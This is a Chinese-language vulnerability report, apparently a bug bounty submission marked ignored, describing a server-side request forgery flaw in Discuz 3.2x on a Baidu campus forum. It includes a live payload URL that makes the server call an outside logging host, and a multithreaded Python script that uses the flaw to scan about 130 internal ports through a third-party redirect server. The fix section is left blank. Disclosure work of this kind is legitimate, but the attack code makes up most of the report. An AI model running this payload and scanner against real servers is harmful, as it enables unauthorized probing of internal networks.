---
title: XX一处SSRF
slug: 0120
---
# XX一处SSRF

漏洞状态：已忽略

漏洞名称：百度一处SSRF（附poc）

提交时间：2018-04-10 16:22:49

漏洞类型：应用漏洞/设计缺陷/逻辑错误

危害等级：高危

奖励积分：0

漏洞描述：

1. 发现方式：请尽量详细描述，保留场景/截图/重现方法等等



百度某站点使用了discuz3.2x ，3.2x存在一处SSRF通用漏洞，简单的测试了一下存在访问情况，以及打到百度公司ip

漏洞payload

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964619134-118de1ac-5def-4227-9d75-85bb3b32c660.png)

http://campus.baidu.com/forum.php?mod=ajax&action=downremoteimg&message=[img]http://vdqlcz.ceye.io/dict.php?data=helo.jpg[/img]



2. 漏洞证明：请在这里写POC



用脚本探测一下内网端口，加以确认该问题



import requests

import threading

import Queue

import time



threads_count = 2

que = Queue.Queue()

lock = threading.Lock()

threads = []

ports = [21,22,23,25,69,80,81,82,83,84,110,389,389,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]

for i in ports:

que.put(str(i))

def run():

while que.qsize() > 0:

p = que.get()

print p + "       \r",

try:

url = "http://campus.baidu.com/forum.php?mod=ajax&action=downremoteimg&message=[img]http://fuzz.90fox.com/ssrf.php?s=ftp%26ip=127.0.0.1%26port={port}%26data=hello.jpg[/img]".format(

port=p)

r = requests.get(url,timeout=2.8)

except:

lock.acquire()

print "{port}  Open".format(port=p)

lock.release()

for i in range(threads_count):

t = threading.Thread(target=run)

threads.append(t)

t.setDaemon(True)

t.start()



while que.qsize() > 0:

time.sleep(1.0)



![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779964619906-4b9e5287-a70b-4545-88e6-cea3366691c6.png)

3. 修复方案：请提供大致的修复方案